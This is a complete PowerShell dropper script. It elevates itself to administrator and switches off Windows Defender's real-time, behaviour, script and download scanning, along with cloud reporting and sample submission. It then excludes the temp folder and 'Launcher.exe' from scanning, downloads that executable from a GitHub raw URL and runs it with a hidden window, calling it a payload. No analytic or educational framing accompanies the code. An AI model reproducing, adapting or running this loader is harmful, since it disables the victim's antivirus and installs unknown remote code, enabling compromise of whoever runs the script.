# --- 1. Self-elevate ---
if (-not ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$ErrorActionPreference = "SilentlyContinue"

# --- 2. Defender ops: soft-fail if provider missing (WDAG, Server Core, etc.) ---
$defenderAvailable = $true
try {
    Get-MpPreference -ErrorAction Stop | Out-Null
} catch {
    $defenderAvailable = $false
}

if ($defenderAvailable) {
    Set-MpPreference -DisableRealtimeMonitoring  $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring  $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning      $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection      $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen    $true -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting              0     -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent       2     -ErrorAction SilentlyContinue

    $TempDir = $env:TEMP
    $DstPath = Join-Path $TempDir "Launcher.exe"

    Add-MpPreference -ExclusionPath    $TempDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath    $DstPath -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "Launcher.exe" -ErrorAction SilentlyContinue
} else {
    Write-Host "[i] Defender provider unavailable in this environment - skipping AV ops."
}

# --- 3. Fetch + execute (runs regardless) ---
$Url      = "https://raw.githubusercontent.com/xdwdeblan888-sys/GFHDSKDHEUFHVDGSYHJBFHVDSHBFDVdb/refs/heads/main/Launcher.exe"
$TempDir  = $env:TEMP
$DstPath  = Join-Path $TempDir "Launcher.exe"

try {
    Invoke-WebRequest -Uri $Url -OutFile $DstPath -UseBasicParsing -TimeoutSec 60
} catch {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $Url -OutFile $DstPath -UseBasicParsing -TimeoutSec 60
}

if (Test-Path $DstPath) {
    Write-Host "[+] Payload at: $DstPath"
    Start-Process -FilePath $DstPath -WindowStyle Hidden
} else {
    Write-Host "[!] Payload download failed."
}
